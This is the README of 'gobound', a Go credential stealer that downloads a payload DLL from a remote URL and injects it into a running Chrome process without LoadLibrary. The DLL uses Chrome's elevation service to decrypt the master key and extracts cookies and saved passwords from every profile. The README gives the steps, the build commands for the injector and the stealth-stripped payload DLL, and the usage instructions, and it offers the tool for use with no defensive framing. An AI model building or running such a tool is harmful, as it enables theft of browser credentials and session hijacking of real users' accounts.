# gobound

remote dll injection into chrome to extract cookies and passwords via the chrome elevator com interface.
this works for V20 cookies/passwords (app bound encryption), for prior versions just call cryptunprotect as curr user

## what it does

1. finds a running chrome process
2. downloads a payload dll from a remote url
3. injects the dll into chrome using manual pe mapping (no loadlibrary)
4. the dll uses chrome's elevation service to decrypt the master key
5. extracts cookies and passwords from all chrome profiles
6. sends data back via named pipe
7. saves everything to `chrome_data.json`

## building

### injector (cmd/)

```
cd cmd
go build -o gobound.exe
```

### payload dll (dll/main/)

```
cd dll/main
go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o payload.dll
```

## usage

1. build the payload dll
2. host it somewhere accessible via https
3. update the download url in `cmd/main.go`
4. build the injector
5. run `gobound.exe` while chrome is running

## output

`chrome_data.json` contains:
- master key (base64)
- cookies (profile, host, name, value)
- passwords (profile, url, username, password)

## dependencies

- github.com/carved4/go-wincall - syscalls and win32 api
- modernc.org/sqlite - pure go sqlite for reading chrome dbs
